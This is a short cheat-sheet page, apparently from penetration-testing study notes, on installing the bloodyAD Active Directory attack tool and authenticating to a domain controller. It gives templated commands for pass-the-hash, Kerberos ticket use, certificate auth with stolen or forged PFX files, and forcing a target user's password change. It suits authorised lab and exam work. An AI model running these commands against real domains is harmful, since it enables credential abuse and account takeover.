# 08.07 bloodyAD Installation Authentication

> Install `bloodyAD` — modern ldap3-based AD attack tool that ditches Impacket and speaks LDAP/LDAPS natively.

## Overview

bloodyAD is a modern AD attack tool using ldap3 (no Impacket dependency). It supports all auth methods and works natively over LDAP/LDAPS. Written by CravateRouge; actively maintained and commonly seen in labs and exams.

## Steps

- Supports: password, NT hash, Kerberos ccache, NTLM hash, and certificate (PFX) auth
- --host is the DC IP or hostname; -d is the short domain name
- --secure forces LDAPS (port 636); required for some password change operations
- --kerberos uses the current KRB5CCNAME; combine with -k for ticket-based auth
- Certificate auth: -c pfx:<cert.pfx>:<pass> — works after shadow credentials or ADCS ESC attacks
- Verbose output with -v; output format options with -f (json, pretty, csv)

## Commands

### Install bloodyAD

```bash
pip3 install bloodyAD
# or pipx for isolation:
pipx install bloodyAD
# or from source:
git clone https://github.com/CravateRouge/bloodyAD && cd bloodyAD && pip3 install .
```

### Password authentication

```bash
bloodyAD -u user -p 'P@ss' -d DOMAIN --host DC_IP get object Administrator
```

### Pass-the-Hash (NT hash)

```bash
bloodyAD -u user -p :NThash -d DOMAIN --host DC_IP get object Administrator
bloodyAD -u user -c ":NThash" -d DOMAIN --host DC_IP get object Administrator
```

### Kerberos ticket auth

```bash
export KRB5CCNAME=/tmp/user.ccache
bloodyAD -u user -p '' -d DOMAIN --host DC_FQDN --kerberos get object Administrator
```

### Certificate auth (PFX from shadow creds / ADCS)

```bash
bloodyAD -u targetuser -c 'pfx:targetuser_cert.pfx:certpass' -d DOMAIN --host DC_IP get object targetuser
# Self-signed cert from pywhisker:
bloodyAD -u targetuser -c 'pfx:path/to/cert.pfx:' -d DOMAIN --host DC_IP get object targetuser --attr unicodePwd
```

### Force LDAPS (required for some password ops)

```bash
bloodyAD -u user -p pass -d DOMAIN --host DC_IP --secure set password targetuser 'NewPass123!'
```
